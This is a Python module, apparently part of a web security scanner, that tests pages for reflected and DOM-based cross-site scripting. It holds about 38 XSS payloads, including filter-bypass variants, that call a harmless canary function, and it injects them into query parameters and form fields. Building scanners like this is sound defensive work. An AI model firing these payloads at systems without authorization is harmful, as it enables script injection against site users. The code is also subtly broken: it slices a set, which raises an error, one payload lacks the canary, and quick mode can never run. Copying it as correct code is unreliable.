"""XSS scanner module — 40+ payloads with context-aware detection."""
import html
import re
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

from app.scanner.crawler import CrawledPage
from app.scanner.http_client import HttpClient
from app.scanner.modules.base import BaseModule, Finding
from app.scanner.modules.registry import ModuleRegistry

# Unique canary strings for unambiguous reflection detection
XSS_CANARY = "scntm7x5s"
XSS_CANARY_ATTR = "scntm_attr"

# ── Context-aware payloads ────────────────────────────────────────────────────
# Group 1: HTML context (breaks out of tags)
HTML_CONTEXT_PAYLOADS = [
    f'<script>{XSS_CANARY}()</script>',
    f'<img src=x onerror={XSS_CANARY}()>',
    f'<svg/onload={XSS_CANARY}()>',
    f'<body onload={XSS_CANARY}()>',
    f'<details open ontoggle={XSS_CANARY}()>',
    f'<marquee onstart={XSS_CANARY}()>',
    f'<video><source onerror={XSS_CANARY}()>',
    f'<input autofocus onfocus={XSS_CANARY}()>',
    f'<select autofocus onfocus={XSS_CANARY}()>',
    f'<textarea autofocus onfocus={XSS_CANARY}()>',
]

# Group 2: Attribute context (breaks out of attribute value)
ATTR_CONTEXT_PAYLOADS = [
    f'" onmouseover="{XSS_CANARY}()" x="',
    f"' onmouseover='{XSS_CANARY}()' x='",
    f'" onfocus="{XSS_CANARY}()" autofocus="',
    f'" onblur="{XSS_CANARY}()" x="',
    f'"><img src=x onerror={XSS_CANARY}()>',
    f"'><svg onload={XSS_CANARY}()>",
    f'" style="animation-name:rotation" onanimationstart="{XSS_CANARY}()"',
]

# Group 3: JavaScript context (breaks out of JS strings)
JS_CONTEXT_PAYLOADS = [
    f"';{XSS_CANARY}()//",
    f'";{XSS_CANARY}()//',
    f"`);{XSS_CANARY}()//",
    f"</script><script>{XSS_CANARY}()</script>",
    f"'};{XSS_CANARY}()//",
]

# Group 4: URL context (href/src attributes)
URL_CONTEXT_PAYLOADS = [
    f"javascript:{XSS_CANARY}()",
    f"data:text/html,<script>{XSS_CANARY}()</script>",
    f"vbscript:{XSS_CANARY}()",
]

# Group 5: WAF/filter bypass payloads
WAF_BYPASS_PAYLOADS = [
    f"<ScRiPt>{XSS_CANARY}()</ScRiPt>",
    f"<img src=x onerror={XSS_CANARY}&#40;&#41;>",
    f'<svg><script>alert&#40;1&#41;</script></svg>',
    f"<img src=\"x\" onerror=\"{XSS_CANARY}()\">",
    f"<<script>>{XSS_CANARY}()<</script>>",
    f'<scr\x00ipt>{XSS_CANARY}()</scr\x00ipt>',
    f"<img src=1 href=1 onerror=\"javascript:{XSS_CANARY}()\">",
    f'<script\x20type="text/javascript">{XSS_CANARY}()</script>',
    f'<object data="javascript:{XSS_CANARY}()">',
    f'<iframe src="javascript:{XSS_CANARY}()">',
]

# Group 6: Template literal / ES6
TEMPLATE_PAYLOADS = [
    f"${{'{XSS_CANARY}'}}",
    f"#{{{XSS_CANARY}()}}",
    f"@{{{XSS_CANARY}()}}",
]

# Full payload list (all 40+)
ALL_PAYLOADS = (
    HTML_CONTEXT_PAYLOADS
    + ATTR_CONTEXT_PAYLOADS
    + JS_CONTEXT_PAYLOADS
    + URL_CONTEXT_PAYLOADS
    + WAF_BYPASS_PAYLOADS
    + TEMPLATE_PAYLOADS
)

# Quick scan: lightweight set — 5 payloads covering the most common contexts
QUICK_PAYLOADS = [
    f'<script>{XSS_CANARY}()</script>',
    f'"><img src=x onerror={XSS_CANARY}()>',
    f"'><svg/onload={XSS_CANARY}()>",
    f'" onmouseover="{XSS_CANARY}()" x="',
    f"javascript:{XSS_CANARY}()",
]

# Patterns to detect encoding (false-positive reduction)
HTML_ENCODED = re.compile(r"&lt;|&gt;|&amp;|&#x3[cC];|&#60;")


def _is_reflection_unencoded(body: str, payload: str, canary: str) -> bool:
    """Return True only if canary appears AND is not HTML-encoded."""
    if canary not in body:
        return False
    # Find surrounding context
    idx = body.find(canary)
    context = body[max(0, idx - 50):idx + len(canary) + 50]
    if HTML_ENCODED.search(context):
        return False
    return True


def _detect_context(page_html: str, param_value: str) -> str:
    """Guess which context the parameter value is reflected in."""
    if not param_value:
        return "html"
    idx = page_html.find(param_value)
    if idx == -1:
        return "html"
    before = page_html[max(0, idx - 200):idx]
    if re.search(r'<script[^>]*>', before, re.I) and not re.search(r'</script>', before, re.I):
        return "js"
    attr_match = re.search(r'<\w+[^>]*\s[\w-]+=["\']$', before)
    if attr_match:
        return "attr"
    href_match = re.search(r'href=|src=|action=', before[-50:], re.I)
    if href_match:
        return "url"
    return "html"


@ModuleRegistry.register
class XssModule(BaseModule):
    name = "xss"
    description = "Tests for reflected XSS — 40+ payloads, context-aware detection"
    scan_modes = ["quick", "full"]
    is_active = True

    async def active_test_async(self, page: CrawledPage, http_client: HttpClient) -> list[Finding]:
        findings: list[Finding] = []
        parsed = urlparse(page.url)
        query_params = parse_qs(parsed.query)
        is_full = True  # orchestrator decides mode; treat as full unless overridden

        # Fetch baseline to detect reflected params
        try:
            baseline = await http_client.get(page.url)
            baseline_text = baseline.text
        except Exception:
            baseline_text = ""

        # ── Test query parameters ─────────────────────────────────────────────
        for param_name, param_values in query_params.items():
            original_value = param_values[0]
            # Determine injection context
            ctx = _detect_context(baseline_text, original_value)
            payloads = self._select_payloads(ctx, is_full)

            for payload in payloads:
                test_params = {k: v[0] for k, v in query_params.items()}
                test_params[param_name] = payload
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path, "", urlencode(test_params), "",
                ))
                try:
                    response = await http_client.get(test_url)
                except Exception:
                    continue

                if _is_reflection_unencoded(response.text, payload, XSS_CANARY):
                    findings.append(self._make_finding(
                        vuln_type=f"Reflected XSS ({ctx.upper()} context)",
                        url=page.url,
                        param=param_name,
                        payload=payload,
                        test_url=test_url,
                        body=response.text,
                    ))
                    break  # One confirmed finding per parameter is sufficient

        # ── Test form inputs ──────────────────────────────────────────────────
        for form in page.forms:
            for inp in form.inputs:
                if not inp.get("name"):
                    continue
                payload = HTML_CONTEXT_PAYLOADS[0]
                data = {i["name"]: i.get("value", "test") for i in form.inputs if i.get("name")}
                data[inp["name"]] = payload

                try:
                    if form.method == "POST":
                        response = await http_client.post(form.action, data=data)
                    else:
                        test_url = f"{form.action}?{urlencode(data)}"
                        response = await http_client.get(test_url)
                except Exception:
                    continue

                if _is_reflection_unencoded(response.text, payload, XSS_CANARY):
                    findings.append(self._make_finding(
                        vuln_type="Reflected XSS (Form input)",
                        url=form.action,
                        param=inp["name"],
                        payload=payload,
                        test_url=form.action,
                        body=response.text,
                    ))
                    break  # One per form

        # ── DOM-based heuristic: detect dangerous sinks with reflected value ──
        if not findings:
            dom_findings = self._check_dom_sinks(page, baseline_text)
            findings.extend(dom_findings)

        return findings

    def _select_payloads(self, context: str, is_full: bool) -> list[str]:
        if not is_full:
            return QUICK_PAYLOADS
        if context == "js":
            return JS_CONTEXT_PAYLOADS + HTML_CONTEXT_PAYLOADS[:3] + WAF_BYPASS_PAYLOADS[:3]
        if context == "attr":
            return ATTR_CONTEXT_PAYLOADS + HTML_CONTEXT_PAYLOADS[:3] + WAF_BYPASS_PAYLOADS[:3]
        if context == "url":
            return URL_CONTEXT_PAYLOADS + HTML_CONTEXT_PAYLOADS[:3]
        return HTML_CONTEXT_PAYLOADS + ATTR_CONTEXT_PAYLOADS[:3] + WAF_BYPASS_PAYLOADS[:4]

    def _make_finding(self, vuln_type, url, param, payload, test_url, body) -> Finding:
        return Finding(
            module_name=self.name,
            vuln_type=vuln_type,
            severity="high",
            cvss_score=6.1,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            owasp_category="A03",
            cwe_id="CWE-79",
            affected_url=url,
            affected_parameter=param,
            description=(
                f"Parameter '{param}' reflects user input without encoding. "
                "Attackers can inject arbitrary scripts into the page."
            ),
            remediation=(
                "Encode all user input before rendering in HTML/JS/URL/attribute contexts. "
                "Implement a strict Content-Security-Policy. "
                "Use context-aware templating (e.g., Jinja2 auto-escape, React JSX)."
            ),
            confidence="confirmed",
            evidence=[
                {"type": "payload", "title": "XSS Payload", "content": payload},
                {"type": "request", "title": "Test URL", "content": test_url},
                {"type": "response", "title": "Reflected Content", "content": self._extract_context(body, XSS_CANARY)},
            ],
        )

    @staticmethod
    def _check_dom_sinks(page: CrawledPage, html_text: str) -> list[Finding]:
        """Heuristic: flag pages using dangerous JS sinks with URL-derived values."""
        DOM_SINKS = re.compile(
            r"(document\.write|innerHTML|outerHTML|eval|setTimeout|setInterval"
            r"|location\.hash|location\.search|location\.href)\s*[=(]",
            re.I,
        )
        DOM_SOURCES = re.compile(
            r"(location\.hash|location\.search|document\.referrer|window\.name"
            r"|document\.URL|location\.href)\b",
            re.I,
        )

        sink_matches = DOM_SINKS.findall(html_text)
        source_matches = DOM_SOURCES.findall(html_text)

        if sink_matches and source_matches:
            return [Finding(
                module_name="xss",
                vuln_type="DOM-Based XSS (Potential)",
                severity="medium",
                cvss_score=5.4,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
                owasp_category="A03",
                cwe_id="CWE-79",
                affected_url=page.url,
                affected_parameter=None,
                description=(
                    "JavaScript on this page reads from URL-controlled sources "
                    f"({', '.join(set(source_matches[:3])[:3])}) and writes to dangerous sinks "
                    f"({', '.join(set(sink_matches[:3])[:3])}), indicating potential DOM-XSS."
                ),
                remediation=(
                    "Sanitize data from DOM sources before passing to sinks. "
                    "Use DOMPurify or the Trusted Types API."
                ),
                confidence="tentative",
                evidence=[
                    {"type": "log", "title": "Dangerous Sinks Found", "content": ", ".join(set(sink_matches[:5]))},
                    {"type": "log", "title": "DOM Sources Found", "content": ", ".join(set(source_matches[:5]))},
                ],
            )]
        return []

    @staticmethod
    def _extract_context(body: str, marker: str, context_chars: int = 120) -> str:
        idx = body.find(marker)
        if idx == -1:
            return ""
        start = max(0, idx - context_chars)
        end = min(len(body), idx + len(marker) + context_chars)
        return f"...{body[start:end]}..."
